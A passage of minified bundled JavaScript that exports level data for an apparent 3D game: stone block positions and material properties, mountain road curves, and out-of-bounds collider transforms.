:23.61716998890282,z:-1363.6526695797245},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-221.81197223204103,y:19.584933261189903,z:-1377.5130085991086},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-155.10991319536674,y:43.27330529705512,z:-1369.2356410663278},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-234.08065582506902,y:21.77498398855006,z:-1377.077840974627},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-124.31395915947914,y:4.278646769554018,z:-1507.347632354461}];
},{}],205:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:2,x:0,y:0,z:0,focused:!1},{material:"granite",dimensions:3,x:0,y:0,z:2,focused:!1},{material:"granite",dimensions:2,x:2,y:2,z:0,focused:!1},{material:"granite",dimensions:2,x:3,y:3,z:3,focused:!1},{material:"granite",dimensions:2,x:3,y:0,z:2,focused:!1},{material:"granite",dimensions:1,x:2,y:0,z:0,focused:!1},{material:"limestone",dimensions:1,x:3,y:0,z:0,focused:!1},{material:"limestone",dimensions:1,x:4,y:0,z:0,focused:!1},{material:"granite",dimensions:1,x:2,y:1,z:0,focused:!1},{material:"granite",dimensions:1,x:3,y:1,z:0,focused:!1},{material:"limestone",dimensions:1,x:4,y:1,z:0,focused:!1},{material:"granite",dimensions:1,x:4,y:0,z:4,focused:!1},{material:"granite",dimensions:1,x:4,y:1,z:4,focused:!1},{material:"granite",dimensions:1,x:3,y:0,z:4,focused:!1},{material:"granite",dimensions:1,x:3,y:1,z:4,focused:!1},{material:"granite",dimensions:1,x:0,y:2,z:0,focused:!1},{material:"granite",dimensions:1,x:1,y:2,z:0,focused:!1},{material:"limestone",dimensions:1,x:0,y:3,z:0,focused:!1},{material:"granite",dimensions:1,x:1,y:3,z:0,focused:!1},{material:"granite",dimensions:1,x:0,y:4,z:0,focused:!1},{material:"granite",dimensions:1,x:1,y:4,z:0,focused:!1},{material:"granite",dimensions:1,x:0,y:2,z:1,focused:!1},{material:"granite",dimensions:1,x:1,y:2,z:1,focused:!1},{material:"limestone",dimensions:1,x:0,y:3,z:1,focused:!1},{material:"granite",dimensions:1,x:1,y:3,z:1,focused:!1},{material:"limestone",dimensions:1,x:0,y:4,z:1,focused:!1},{material:"granite",dimensions:1,x:1,y:4,z:1,focused:!1},{material:"limestone",dimensions:1,x:4,y:0,z:1,focused:!1},{material:"limestone",dimensions:1,x:3,y:0,z:1,focused:!1},{material:"granite",dimensions:1,x:3,y:1,z:1,focused:!1},{material:"granite",dimensions:1,x:4,y:1,z:1,focused:!1},{material:"granite",dimensions:1,x:4,y:2,z:0,focused:!1},{material:"limestone",dimensions:1,x:4,y:2,z:1,focused:!1},{material:"limestone",dimensions:1,x:4,y:2,z:2,focused:!1},{material:"granite",dimensions:1,x:4,y:2,z:3,focused:!1},{material:"granite",dimensions:1,x:4,y:2,z:4,focused:!1},{material:"limestone",dimensions:1,x:3,y:2,z:2,focused:!1},{material:"granite",dimensions:1,x:3,y:2,z:3,focused:!1},{material:"limestone",dimensions:1,x:3,y:2,z:4,focused:!1},{material:"limestone",dimensions:1,x:4,y:3,z:0,focused:!1},{material:"limestone",dimensions:1,x:4,y:3,z:1,focused:!1},{material:"granite",dimensions:1,x:4,y:3,z:2,focused:!1},{material:"granite",dimensions:1,x:4,y:4,z:0,focused:!1},{material:"limestone",dimensions:1,x:4,y:4,z:1,focused:!1},{material:"limestone",dimensions:1,x:4,y:4,z:2,focused:!1},{material:"granite",dimensions:1,x:2,y:4,z:0,focused:!1},{material:"limestone",dimensions:1,x:3,y:4,z:0,focused:!1},{material:"granite",dimensions:1,x:2,y:4,z:1,focused:!1},{material:"granite",dimensions:1,x:3,y:4,z:1,focused:!1},{material:"limestone",dimensions:1,x:0,y:4,z:2,focused:!1},{material:"granite",dimensions:1,x:1,y:4,z:2,focused:!1},{material:"limestone",dimensions:1,x:2,y:4,z:2,focused:!1},{material:"granite",dimensions:1,x:3,y:4,z:2,focused:!1},{material:"granite",dimensions:1,x:0,y:3,z:2,focused:!1},{material:"granite",dimensions:1,x:1,y:3,z:2,focused:!1},{material:"granite",dimensions:1,x:2,y:3,z:2,focused:!1},{material:"limestone",dimensions:1,x:0,y:3,z:3,focused:!1},{material:"granite",dimensions:1,x:1,y:3,z:3,focused:!1},{material:"limestone",dimensions:1,x:2,y:3,z:3,focused:!1},{material:"granite",dimensions:1,x:0,y:3,z:4,focused:!1},{material:"limestone",dimensions:1,x:1,y:3,z:4,focused:!1},{material:"granite",dimensions:1,x:2,y:3,z:4,focused:!1},{material:"limestone",dimensions:1,x:0,y:4,z:3,focused:!1},{material:"limestone",dimensions:1,x:1,y:4,z:3,focused:!1},{material:"granite",dimensions:1,x:2,y:4,z:3,focused:!1},{material:"granite",dimensions:1,x:0,y:4,z:4,focused:!1},{material:"granite",dimensions:1,x:1,y:4,z:4,focused:!1},{material:"granite",dimensions:1,x:2,y:4,z:4,focused:!1},{material:"granite",dimensions:1,x:2,y:5,z:3,focused:!1},{material:"granite",dimensions:1,x:0,y:5,z:4,focused:!1},{material:"granite",dimensions:1,x:1,y:5,z:4,focused:!1},{material:"limestone",dimensions:1,x:2,y:5,z:4,focused:!1},{material:"granite",dimensions:1,x:3,y:5,z:2,focused:!1},{material:"granite",dimensions:1,x:0,y:5,z:2,focused:!1},{material:"granite",dimensions:1,x:1,y:5,z:2,focused:!1},{material:"limestone",dimensions:1,x:2,y:5,z:2,focused:!1},{material:"limestone",dimensions:1,x:3,y:6,z:2,focused:!1},{material:"granite",dimensions:1,x:2,y:6,z:3,focused:!1},{material:"limestone",dimensions:1,x:3,y:6,z:4,focused:!1}];
},{}],206:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:1,x:1,y:5,z:4,focused:!1},{material:"granite",dimensions:1,x:2,y:5,z:4,focused:!1},{material:"limestone",dimensions:1,x:1,y:5,z:4,focused:!1},{material:"granite",dimensions:1,x:0,y:5,z:4,focused:!1},{material:"granite",dimensions:1,x:0,y:5,z:3,focused:!1},{material:"limestone",dimensions:1,x:3,y:5,z:4,focused:!1},{material:"granite",dimensions:1,x:1,y:6,z:4,focused:!1},{material:"granite",dimensions:1,x:2,y:6,z:4,focused:!1},{material:"limestone",dimensions:1,x:1,y:6,z:4,focused:!1},{material:"limestone",dimensions:1,x:0,y:6,z:4,focused:!1},{material:"granite",dimensions:1,x:0,y:6,z:3,focused:!1},{material:"limestone",dimensions:1,x:3,y:6,z:4,focused:!1},{material:"limestone",dimensions:1,x:1,y:7,z:4,focused:!1},{material:"granite",dimensions:1,x:2,y:7,z:4,focused:!1},{material:"granite",dimensions:1,x:1,y:7,z:4,focused:!1},{material:"granite",dimensions:1,x:0,y:7,z:4,focused:!1},{material:"limestone",dimensions:1,x:0,y:7,z:3,focused:!1},{material:"granite",dimensions:1,x:3,y:7,z:4,focused:!1},{material:"granite",dimensions:1,x:1,y:6,z:0,focused:!1},{material:"granite",dimensions:1,x:1,y:5,z:0,focused:!1},{material:"granite",dimensions:2,x:3.1,y:3,z:3.1,focused:!1},{material:"limestone",dimensions:2,x:2,y:1,z:3,focused:!1},{material:"granite",dimensions:2,x:1,y:1,z:0,focused:!1},{material:"granite",dimensions:2,x:0,y:0,z:2,focused:!1},{material:"limestone",dimensions:2,x:0,y:2,z:3,focused:!1},{material:"granite",dimensions:2,x:-.75,y:1.75,z:1.25,focused:!1},{material:"limestone",dimensions:2,x:-.1,y:3,z:-.1,focused:!1},{material:"granite",dimensions:2,x:2,y:2.5,z:-1,focused:!1},{material:"limestone",dimensions:2,x:2.25,y:0,z:-1,focused:!1},{material:"limestone",dimensions:2,x:1,y:6,z:1.5,focused:!1},{material:"limestone",dimensions:2,x:-1,y:5,z:.5,focused:!1},{material:"granite",dimensions:2,x:3.5,y:17,z:-.25,focused:!1},{material:"granite",dimensions:3,x:1,y:3,z:1,focused:!1},{material:"limestone",dimensions:3,x:3,y:1,z:0,focused:!1}];
},{}],207:[function(require,module,exports){
module.exports=[{material:"limestone",dimensions:3,x:0,y:0,z:0,focused:!1},{material:"granite",dimensions:3,x:0,y:0,z:3,focused:!1},{material:"limestone",dimensions:3,x:3,y:0,z:0,focused:!1},{material:"granite",dimensions:3,x:3,y:0,z:3,focused:!1},{material:"limestone",dimensions:3,x:-2.5,y:0,z:1.5,focused:!1},{material:"limestone",dimensions:3,x:-2.5,y:0,z:-1.5,focused:!1},{material:"granite",dimensions:3,x:-2.5,y:0,z:4.5,focused:!1},{material:"limestone",dimensions:3,x:-1.5,y:2.5,z:0,focused:!1},{material:"granite",dimensions:3,x:1.5,y:2.5,z:1.5,focused:!1},{material:"granite",dimensions:2,x:-1.25,y:3,z:3.25,focused:!1},{material:"limestone",dimensions:2,x:2,y:0,z:-2.5,focused:!1},{material:"limestone",dimensions:2,x:0,y:0,z:-2,focused:!1},{material:"granite",dimensions:2,x:4,y:0,z:-2,focused:!1},{material:"granite",dimensions:2,x:2,y:2,z:-.5,focused:!1},{material:"limestone",dimensions:2,x:.3,y:5,z:1.8,focused:!1},{material:"limestone",dimensions:1,x:1,y:4,z:0,focused:!1},{material:"granite",dimensions:1,x:2,y:4,z:0,focused:!1},{material:"limestone",dimensions:1,x:3,y:4,z:0,focused:!1},{material:"granite",dimensions:1,x:4,y:4,z:0,focused:!1},{material:"limestone",dimensions:1,x:1,y:5,z:1,focused:!1},{material:"granite",dimensions:1,x:2,y:5,z:1,focused:!1},{material:"limestone",dimensions:1,x:3,y:5,z:1,focused:!1},{material:"granite",dimensions:1,x:4,y:5,z:1,focused:!1},{material:"limestone",dimensions:1,x:2,y:6,z:2,focused:!1},{material:"granite",dimensions:1,x:2,y:6,z:3,focused:!1},{material:"limestone",dimensions:1,x:3,y:6,z:2,focused:!1},{material:"granite",dimensions:1,x:3,y:6,z:3,focused:!1},{material:"limestone",dimensions:1,x:4,y:6,z:2,focused:!1},{material:"granite",dimensions:1,x:4,y:6,z:3,focused:!1},{material:"limestone",dimensions:1,x:3,y:7,z:2,focused:!1},{material:"granite",dimensions:1,x:3,y:7,z:3,focused:!1},{material:"limestone",dimensions:1,x:4,y:7,z:2,focused:!1},{material:"granite",dimensions:1,x:4,y:7,z:3,focused:!1}];
},{}],208:[function(require,module,exports){
module.exports={mountains3:{oob:require("./oob/oob_3"),level1:{terrain:"flat",point_on_path:.225},level2:{terrain:"cliff",point_on_path:.52},level3:{terrain:"u",point_on_path:.8},road_curve:[[200,10,-0],[200,10,-100],[150,10,-250],[150,10,-350],[100,10,-480],[0,10,-530],[-100,10,-520],[-150,10,-500],[-200,10,-460],[-200,10,-400],[-250,10,-340],[-350,10,-300],[-500,10,-250],[-550,10,-300],[-600,10,-400],[-550,10,-500],[-550,10,-600],[-450,10,-700],[-350,10,-800],[-250,10,-900],[-150,10,-950],[50,10,-1e3],[200,10,-1050],[350,10,-1100],[500,10,-1200],[650,10,-1300],[700,10,-1350],[750,10,-1400],[760,10,-1450],[750,10,-1500],[710,10,-1530],[650,10,-1550],[550,10,-1560],[450,10,-1550],[320,10,-1550],[200,10,-1540],[50,10,-1520],[-150,10,-1500],[-350,10,-1510],[-550,10,-1550],[-750,10,-1700]]},mountains1:{oob:require("./oob/oob_6"),level1:{terrain:"flat",point_on_path:.225},level2:{terrain:"cliffleft",point_on_path:.52},level3:{terrain:"u",point_on_path:.8},road_curve:[[-200,10,-0],[-200,10,-100],[-150,10,-250],[-150,10,-350],[-100,10,-480],[0,10,-530],[100,10,-520],[150,10,-500],[200,10,-460],[200,10,-400],[250,10,-340],[350,10,-300],[500,10,-250],[550,10,-300],[600,10,-400],[550,10,-500],[550,10,-600],[450,10,-700],[350,10,-800],[250,10,-900],[150,10,-950],[-50,10,-1e3],[-200,10,-1050],[-350,10,-1100],[-500,10,-1200],[-650,10,-1300],[-700,10,-1350],[-750,10,-1400],[-760,10,-1450],[-750,10,-1500],[-710,10,-1530],[-650,10,-1550],[-550,10,-1560],[-450,10,-1550],[-320,10,-1550],[-200,10,-1540],[-50,10,-1520],[150,10,-1500],[350,10,-1510],[550,10,-1550],[750,10,-1700]]},mountains2:{oob:require("./oob/oob_5"),level1:{terrain:"flat",point_on_path:.255},level2:{terrain:"cliff",point_on_path:.465},level3:{terrain:"u",point_on_path:.75},road_curve:[[0,10,-0],[0,10,-100],[-100,10,-200],[100,10,-300],[300,10,-400],[280,10,-500],[175,10,-600],[120,10,-700],[180,10,-800],[310,10,-900],[400,10,-1e3],[410,10,-1100],[500,10,-1200],[470,10,-1300],[350,10,-1310],[270,10,-1350],[200,10,-1400],[100,10,-1350],[70,10,-1280],[20,10,-1200],[-100,10,-1300],[-200,10,-1340],[-320,10,-1380],[-400,10,-1400],[-500,10,-1450],[-600,10,-1400],[-700,10,-1300],[-800,10,-1320],[-900,10,-1380],[-1e3,10,-1380]]}};
},{"./oob/oob_3":210,"./oob/oob_5":211,"./oob/oob_6":212}],209:[function(require,module,exports){
module.exports={dimensions:{1:5,2:10,3:15},mass:{1:{granite:16e4,limestone:14e4},2:{granite:77e3,limestone:6e4},3:{granite:4e4,limestone:35e3}},display_mass:{1:{granite:500,limestone:350},2:{granite:1e3,limestone:800},3:{granite:3e3,limestone:2600}},disintegration_point:{1:{granite:1700,limestone:1400},2:{granite:2300,limestone:2e3},3:{granite:3e3,limestone:2800}},boundingBox:{dimensions:{x:50,y:50,z:50},cellsize:10}};
},{}],210:[function(require,module,exports){
module.exports=[];
},{}],211:[function(require,module,exports){
module.exports=[{position:{x:-348,y:-3,z:-836},rotation:{x:0,y:.07999999999999957,z:0},scale:{x:1282,y:5,z:1842}},{position:{x:352,y:48,z:-488},rotation:{x:.08000000000000002,y:0,z:.9},scale:{x:168.39999999999992,y:5,z:95.20000000000003}},{position:{x:340,y:27,z:-400},rotation:{x:.08000000000000002,y:0,z:.9},scale:{x:136.39999999999992,y:5,z:95.60000000000004}},{position:{x:292,y:22,z:-324},rotation:{x:-.27999999999999997,y:-.7000000000000003,z:.7799999999999998},scale:{x:168.39999999999992,y:5,z:136.40000000000003}},{position:{x:232,y:29,z:-264},rotation:{x:1.1400000000000006,y:-.9200000000000004,z:1.9000000000000008},scale:{x:104.39999999999992,y:5,z:136.40000000000003}},{position:{x:376,y:43,z:-564},rotation:{x:-.3400000000000001,y:-.6400000000000002,z:.7599999999999998},scale:{x:369.7000000000003,y:5,z:104.00000000000003}},{position:{x:292,y:34,z:-840},rotation:{x:-.019999999999999993,y:-.8600000000000004,z:.8199999999999998},scale:{x:232.39999999999992,y:13,z:94.80000000000003}},{position:{x:276,y:63,z:-760},rotation:{x:.08000000000000002,y:0,z:.9},scale:{x:168.39999999999992,y:5,z:66.4}},{position:{x:300,y:56,z:-716},rotation:{x:.12000000000000001,y:.8,z:.8},scale:{x:136.40000000000003,y:5,z:90.4}},{position:{x:356,y:24,z:-624},rotation:{x:.019999999999999962,y:-2.86,z:-.5800000000000003},scale:{x:238,y:5,z:178}},{position:{x:480,y:96,z:-372},rotation:{x:0,y:1.04,z:.7200000000000002},scale:{x:130,y:5,z:188.39999999999998}},{position:{x:536,y:56,z:-80},rotation:{x:0,y:-3.9600000000000013,z:-.7200000000000001},scale:{x:178,y:5,z:146}},{position:{x:-84,y:48,z:-484},rotation:{x:0,y:.37999999999999984,z:-.9400000000000003},scale:{x:338.8,y:5,z:139.60000000000002}},{position:{x:-84,y:95,z:-720},rotation:{x:0,y:-.4200000000000001,z:-.8000000000000002},scale:{x:258,y:5,z:138}},{position:{x:-144,y:52,z:-564},rotation:{x:6.938893903907228e-18,y:.8800000000000004,z:-.8200000000000004},scale:{x:162,y:5,z:130}},{position:{x:-132,y:56,z:-640},rotation:{x:-.02,y:-1.3000000000000003,z:-.98},scale:{x:138,y:5,z:122}},{position:{x:-136,y:63,z:-68},rotation:{x:-.02,y:.5399999999999999,z:-1.2600000000000002},scale:{x:146.8,y:5,z:140.40000000000003}},{position:{x:0,y:8,z:-596},rotation:{x:0,y:0,z:-.08},scale:{x:162,y:21,z:387.6}},{position:{x:-132,y:60,z:-328},rotation:{x:-.09,y:-.7599999999999998,z:-.97},scale:{x:138,y:5,z:122}},{position:{x:-184,y:42,z:-216},rotation:{x:-.02,y:.15999999999999973,z:-1.08},scale:{x:98.80000000000001,y:5,z:190.80000000000007}},{position:{x:112,y:16,z:-168},rotation:{x:-.6,y:.68,z:.03999999999999999},scale:{x:114,y:5,z:98}},{position:{x:256,y:47,z:-104},rotation:{x:-1.0799999999999998,y:.68,z:.52},scale:{x:114,y:5,z:98}},{position:{x:228,y:48,z:-192},rotation:{x:.34,y:.22,z:.7200000000000002},scale:{x:94.80000000000004,y:5,z:74.39999999999999}},{position:{x:180,y:28,z:-142},rotation:{x:0,y:-1.840000000000001,z:0},scale:{x:130,y:5,z:82}},{position:{x:-11,y:11,z:-344},rotation:{x:-.09,y:-.7599999999999998,z:-.97},scale:{x:138,y:5,z:122}},{position:{x:208,y:44,z:-968},rotation:{x:1.2400000000000007,y:.2999999999999997,z:-.6950000000000003},scale:{x:527.9999999999997,y:5,z:98}},{position:{x:320,y:-4,z:-1016},rotation:{x:0,y:-.7200000000000003,z:0},scale:{x:162,y:5,z:390.80000000000007}},{position:{x:396,y:35,z:-896},rotation:{x:-.19999999999999998,y:1.5000000000000009,z:-.44000000000000006},scale:{x:162,y:5,z:130}},{position:{x:396,y:-5,z:-976},rotation:{x:0,y:-.31999999999999995,z:0},scale:{x:106,y:5,z:297.19999999999993}},{position:{x:544,y:10,z:-828},rotation:{x:-.14,y:.9000000000000001,z:-.8999999999999999},scale:{x:226.8,y:5,z:236.40000000000003}},{position:{x:404,y:-1,z:-1400},rotation:{x:0,y:0,z:0},scale:{x:242,y:5,z:306}},{position:{x:476,y:-2,z:-1272},rotation:{x:0,y:.30000000000000016,z:0},scale:{x:146,y:5,z:146}},{position:{x:472,y:-2,z:-1188},rotation:{x:0,y:-.5599999999999998,z:0},scale:{x:146,y:5,z:146}},{position:{x:656,y:-48,z:-1120},rotation:{x:0,y:-.4000000000000001,z:1.2000000000000004},scale:{x:178,y:5,z:258}},{position:{x:792,y:-73,z:-1360},rotation:{x:0,y:-.6000000000000001,z:1.2000000000000004},scale:{x:178,y:5,z:258}},{position:{x:912,y:-62,z:-1620},rotation:{x:.4000000000000001,y:-.3599999999999999,z:1.2600000000000005},scale:{x:418,y:5,z:274}},{position:{x:-192,y:192,z:-1288},rotation:{x:0,y:0,z:0},scale:{x:50,y:5,z:50}},{position:{x:88,y:59,z:-1184},rotation:{x:0,y:-.7999999999999999,z:1.18},scale:{x:194,y:5,z:162}},{position:{x:-80,y:23,z:-1236},rotation:{x:-.9400000000000002,y:-.30000000000000004,z:-.4400000000000001},scale:{x:210,y:5,z:146}},{position:{x:-72,y:27,z:-1352},rotation:{x:0,y:-1.7000000000000008,z:-1.1200000000000003},scale:{x:98,y:.9999999999999999,z:130}},{position:{x:168,y:39,z:-1272},rotation:{x:-.08000000000000003,y:-.9600000000000001,z:.8799999999999999},scale:{x:178,y:5,z:82}},{position:{x:-744,y:47,z:-1496},rotation:{x:-.02,y:-.36,z:-.8800000000000004},scale:{x:306,y:5,z:122.40000000000002}},{position:{x:-424,y:38,z:-1316},rotation:{x:-.9400000000000002,y:-.14,z:-.12000000000000006},scale:{x:290,y:5,z:162}},{position:{x:-440,y:31,z:-1536},rotation:{x:.8400000000000003,y:0,z:0},scale:{x:162,y:5,z:98}},{position:{x:-304,y:30,z:-1504},rotation:{x:.8400000000000003,y:-.43999999999999995,z:.39999999999999997},scale:{x:162,y:5,z:98}},{position:{x:-668,y:46,z:-1620},rotation:{x:.8800000000000003,y:.39999999999999997,z:-.39999999999999997},scale:{x:210,y:5,z:194}}];
},{}],212:[function(require,module,exports){
module.exports=[{position:{x:-70,y:-6,z:-1022},rotation:{x:0,y:-.32,z:0},scale:{x:609,y:11,z:178}},{position:{x:524,y:-2,z:-394},rotation:{x:0,y:0,z:0},scale:{x:400,y:5,z:400}},{position:{x:298,y:0,z:-342},rotation:{x:0,y:0,z:.04},scale:{x:50,y:5,z:50}},{position:{x:390,y:19,z:-358},rotation:{x:.7200000000000003,y:0,z:.3},scale:{x:50,y:5,z:50}},{position:{x:346,y:14,z:-374},rotation:{x:.7200000000000003,y:0,z:.3},scale:{x:50,y:5,z:50}},{position:{x:298,y:13,z:-394},rotation:{x:.7200000000000003,y:-.32,z:.3},scale:{x:50,y:5,z:50}},{position:{x:318,y:44,z:-430},rotation:{x:.7200000000000003,y:-.32,z:.3},scale:{x:50,y:5,z:50}},{position:{x:358,y:43,z:-402},rotation:{x:.9600000000000005,y:-.36000000000000004,z:.5400000000000001},scale:{x:50,y:5,z:50}},{position:{x:390,y:42,z:-377},rotation:{x:1.0400000000000005,y:-.32,z:.5700000000000002},scale:{x:50,y:5,z:50}},{position:{x:410,y:18,z:-350},rotation:{x:.9200000000000005,y:-.32,z:.14},scale:{x:50,y:5,z:50}},{position:{x:426,y:45,z:-366},rotation:{x:1.0500000000000003,y:.16000000000000003,z:.029999999999999943},scale:{x:36.080000000000055,y:8.2,z:44.40000000000002}},{position:{x:426,y:17,z:-345},rotation:{x:.8600000000000004,y:.020000000000000007,z:.06},scale:{x:50,y:5,z:50}},{position:{x:286,y:0,z:-302},rotation:{x:0,y:-.32,z:0},scale:{x:50,y:5,z:50}},{position:{x:270,y:3,z:-254},rotation:{x:-.25999999999999995,y:-.32,z:0},scale:{x:50,y:5,z:50}},{position:{x:315,y:2,z:-242},rotation:{x:-.32,y:-.32,z:-.1},scale:{x:50,y:5,z:50}},{position:{x:359,y:2,z:-222},rotation:{x:-.2799999999999999,y:-.34,z:-.18},scale:{x:50,y:5,z:50}},{position:{x:406,y:1,z:-212},rotation:{x:-.18999999999999984,y:-.35500000000000004,z:-.0749999999999999},scale:{x:50,y:5,z:50}},{position:{x:458,y:2,z:-200},rotation:{x:-.2599999999999999,y:-.34500000000000003,z:-.024999999999999904},scale:{x:50,y:5,z:50}},{position:{x:293,y:28,z:-204},rotation:{x:-.8650000000000004,y:-.25999999999999995,z:-.29500000000000015},scale:{x:50,y:5,z:50}},{position:{x:339,y:28,z:-185},rotation:{x:-.8000000000000004,y:-.25999999999999995,z:-.315},scale:{x:50,y:5,z:50}},{position:{x:0,y:0,z:0},rotation:{x:0,y:0,z:0},scale:{x:50,y:5,z:50}},{position:{x:381,y:23,z:-173},rotation:{x:-.8400000000000004,y:-.25999999999999995,z:-.31},scale:{x:50,y:5,z:50}},{position:{x:429,y:18,z:-171},rotation:{x:-.7600000000000003,y:-.25999999999999995,z:-.05000000000000002},scale:{x:50,y:5,z:50}},{position:{x:326,y:65,z:-152},rotation:{x:-1.0050000000000003,y:-.25999999999999995,z:-.38500000000000006},scale:{x:50,y:5,z:50}},{position:{x:284,y:66,z:-175},rotation:{x:-.9750000000000005,y:-.21999999999999992,z:-.3500000000000002},scale:{x:50,y:5,z:50}},{position:{x:373,y:60,z:-132},rotation:{x:-1.0050000000000003,y:-.25999999999999995,z:-.24499999999999997},scale:{x:50,y:5,z:50}},{position:{x:354,y:97,z:-104},rotation:{x:-1.1850000000000005,y:-.7400000000000003,z:-.6050000000000002},scale:{x:50,y:5,z:50}},{position:{x:400,y:63,z:-120},rotation:{x:-1.1850000000000005,y:-1.0200000000000005,z:-.6050000000000002},scale:{x:50,y:5,z:50}},{position:{x:452,y:38,z:-148},rotation:{x:-1.2650000000000006,y:-1.3800000000000008,z:-.5850000000000002},scale:{x:50,y:5,z:50}},{position:{x:492,y:25,z:-152},rotation:{x:-1.2250000000000005,y:-1.1000000000000005,z:-.5650000000000002},scale:{x:50,y:5,z:50}},{position:{x:416,y:37,z:-152},rotation:{x:-1.2650000000000006,y:-1.3800000000000008,z:-.5850000000000002},scale:{x:50,y:5,z:50}},{position:{x:365,y:58,z:-141},rotation:{x:-.8400000000000004,y:-.25999999999999995,z:-.31},scale:{x:50,y:5,z:50}},{position:{x:272,y:105,z:-154},rotation:{x:-1.0750000000000006,y:-.21999999999999992,z:-.3500000000000002},scale:{x:50,y:5,z:50}},{position:{x:313,y:104,z:-130},rotation:{x:-1.0550000000000006,y:-.21999999999999992,z:-.4700000000000003},scale:{x:50,y:5,z:50}},{position:{x:301,y:147,z:-106},rotation:{x:-.8350000000000004,y:.16000000000000006,z:-.4700000000000003},scale:{x:50,y:5,z:50}},{position:{x:333,y:122,z:-102},rotation:{x:-.6150000000000002,y:.4800000000000002,z:-.5700000000000004},scale:{x:50,y:5,z:50}},{position:{x:264,y:148,z:-126},rotation:{x:-.9950000000000006,y:-.21999999999999992,z:-.3300000000000002},scale:{x:50,y:5,z:50}},{position:{x:236,y:104,z:-166},rotation:{x:-.9750000000000005,y:.18000000000000005,z:-.11000000000000017},scale:{x:50,y:5,z:50}},{position:{x:232,y:65,z:-191},rotation:{x:-1.0150000000000006,y:-.21999999999999992,z:-.11000000000000017},scale:{x:50,y:5,z:50}},{position:{x:251,y:27,z:-216},rotation:{x:-.7450000000000003,y:-.25999999999999995,z:-.19500000000000015},scale:{x:50,y:5,z:50}},{position:{x:0,y:0,z:0},rotation:{x:0,y:0,z:0},scale:{x:50,y:5,z:50}},{position:{x:50,y:1,z:-430},rotation:{x:0,y:-.29999999999999993,z:0},scale:{x:484.8200000000013,y:5,z:262.0700000000003}},{position:{x:524,y:-2,z:-394},rotation:{x:0,y:-.32,z:0},scale:{x:146.22000000000025,y:5,z:430.80000000000035}},{position:{x:382,y:-2,z:-766},rotation:{x:0,y:-.8000000000000003,z:0},scale:{x:480.0600000000021,y:5,z:268.53000000000014}},{position:{x:-607,y:-2,z:-1274},rotation:{x:0,y:-.6600000000000007,z:-.020000000000000007},scale:{x:609.2600000000012,y:11.460000000000008,z:178.43}},{position:{x:-547,y:-11,z:-1538},rotation:{x:0,y:.07999999999999932,z:.019999999999999993},scale:{x:677.2600000000008,y:11.460000000000008,z:185.57000000000002}},{position:{x:285,y:3,z:-1526},rotation:{x:-.04000000000000001,y:-.08000000000000068,z:.019999999999999993},scale:{x:836.6299999999932,y:13.86000000000001,z:197.57000000000008}},{position:{x:532,y:5,z:-196},rotation:{x:3.2950000000000013,y:-2.0200000000000014,z:1.0149999999999997},scale:{x:70,y:3.4000000000000004,z:130}},{position:{x:518,y:0,z:-216},rotation:{x:-.09999999999999988,y:.555,z:.05500000000000009},scale:{x:166.09999999999982,y:5,z:50}},{position:{x:612,y:36,z:-283},rotation:{x:3.8550000000000018,y:-2.3400000000000016,z:1.4149999999999996},scale:{x:123.19999999999996,y:3.4000000000000004,z:132}},{position:{x:557,y:17,z:-211},rotation:{x:-.5600000000000002,y:.6200000000000001,z:.4699999999999999},scale:{x:50,y:5,z:50}},{position:{x:644,y:35,z:-380},rotation:{x:4.895000000000002,y:-2.2600000000000016,z:1.7349999999999999},scale:{x:157.59999999999994,y:3.4000000000000004,z:196}},{position:{x:700,y:122,z:-263},rotation:{x:4.850000000000003,y:-2.3000000000000016,z:1.8999999999999997},scale:{x:86.40000000000003,y:3.4000000000000004,z:243.99999999999983}},{position:{x:732,y:137,z:-303},rotation:{x:5.070000000000007,y:-2.620000000000002,z:2.42},scale:{x:56.40000000000002,y:3.4000000000000004,z:219.99999999999983}},{position:{x:628,y:66,z:-492},rotation:{x:4.415000000000002,y:-2.600000000000002,z:1.1749999999999994},scale:{x:157.59999999999994,y:3.4000000000000004,z:196}},{position:{x:174,y:16,z:-243},rotation:{x:-.6650000000000003,y:-.5600000000000002,z:-.21500000000000014},scale:{x:144,y:5,z:74}},{position:{x:54,y:23,z:-307},rotation:{x:-.6250000000000002,y:-.17999999999999994,z:-.4350000000000003},scale:{x:150,y:4.8,z:54}},{position:{x:25,y:9,z:-396},rotation:{x:-.8950000000000005,y:-1.1949999999999985,z:-.8150000000000002},scale:{x:165.99999999999986,y:5,z:154}},{position:{x:178,y:11,z:-520},rotation:{x:.9200000000000003,y:-.4199999999999999,z:.5199999999999999},scale:{x:271.22000000000105,y:5,z:166.07000000000028}},{position:{x:2,y:18,z:-576},rotation:{x:.7600000000000003,y:-.01999999999999969,z:-.12000000000000016},scale:{x:271.22000000000105,y:5,z:166.07000000000028}},{position:{x:-166,y:49,z:-504},rotation:{x:.9200000000000005,y:.5000000000000002,z:-.6000000000000002},scale:{x:271.22000000000105,y:5,z:166.07000000000028}},{position:{x:58,y:36,z:-206},rotation:{x:-.3199999999999999,y:-.5799999999999998,z:-.26},scale:{x:272.8200000000013,y:5,z:162.07000000000028}},{position:{x:-590,y:8,z:-1129},rotation:{x:-.28500000000000003,y:-.6849999999999998,z:-.18500000000000003},scale:{x:152.8200000000013,y:5,z:104.07000000000025}},{position:{x:358,y:59,z:-426},rotation:{x:1.12,y:-.5200000000000001,z:.6600000000000001},scale:{x:160.02000000000137,y:4.8,z:103.0700000000003}},{position:{x:-734,y:15,z:-1249},rotation:{x:-.165,y:-.885,z:-.225},scale:{x:152.8200000000013,y:5,z:104.07000000000025}},{position:{x:-894,y:50,z:-1473},rotation:{x:1.035,y:-2.6450000000000014,z:.655},scale:{x:152.8200000000013,y:5,z:208.07000000000025}},{position:{x:-914,y:33,z:-1401},rotation:{x:1.5350000000000004,y:-2.365000000000001,z:1.655000000000001},scale:{x:152.8200000000013,y:5,z:80.07000000000025}},{position:{x:-814,y:16,z:-1241},rotation:{x:1.8750000000000007,y:-2.205000000000001,z:2.035000000000001},scale:{x:152.8200000000013,y:5,z:80.07000000000025}},{position:{x:-718,y:23,z:-1129},rotation:{x:-.28500000000000003,y:-.12499999999999985,z:-.18500000000000003},scale:{x:288.8200000000013,y:5,z:104.07000000000025}},{position:{x:-70,y:-19,z:-718},rotation:{x:-1.1,y:.05999999999999961,z:.1},scale:{x:433.26